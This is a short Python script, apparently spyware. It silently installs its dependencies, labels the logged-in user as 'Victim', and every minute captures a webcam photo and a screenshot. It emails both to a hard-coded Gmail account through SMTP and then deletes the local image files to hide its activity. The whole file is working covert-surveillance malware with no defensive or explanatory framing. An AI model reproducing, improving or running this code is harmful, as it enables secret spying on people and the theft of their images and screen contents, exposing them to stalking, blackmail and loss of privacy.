import os,time
try:
    import smtplib,cv2,pyautogui
    from email.mime.text import MIMEText
    from email.mime.image import MIMEImage
    from email.mime.multipart import MIMEMultipart
except:
    os.system('pip install -r requirements.txt')


ACCOUNT = 'your_gmail@gmail.com'
PASSWORD = 'your_password@1234'

Victim = os.getlogin()


def camera_click():
    camera = cv2.VideoCapture(0)
    for i in range(1):
      return_value, image = camera.read()
      cv2.imwrite('pic.png', image)
    del(camera)

def screenshoot_click():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('pic2.png')


while True:
    camera_click()
    screenshoot_click()
    with open('pic.png', 'rb') as camera_open:
        img_data = camera_open.read()
    with open('pic2.png', 'rb') as screenshot_open:
        img_data2 = screenshot_open.read()

    msg = MIMEMultipart()
    msg['Subject'] = "Smile Please 🙂"
    msg['To'] = ACCOUNT
    msg['From'] = ACCOUNT
    text = MIMEText('Photo of '+Victim)
    msg.attach(text)


    image1 = MIMEImage(img_data, name=os.path.basename('pic.png'))
    image2 = MIMEImage(img_data2, name=os.path.basename('pic2.png'))
    msg.attach(image1)
    msg.attach(image2)


    s = smtplib.SMTP('smtp.gmail.com',587)
    s.ehlo()
    s.starttls()
    s.ehlo()
    s.login(ACCOUNT,PASSWORD)
    s.sendmail(ACCOUNT,ACCOUNT, msg.as_string())
    s.quit()

    camera_open.close()
    screenshot_open.close()

    if os.path.exists("pic.png"):
        os.remove("pic.png")
    if os.path.exists("pic2.png"):
        os.remove("pic2.png")
    time.sleep(60)
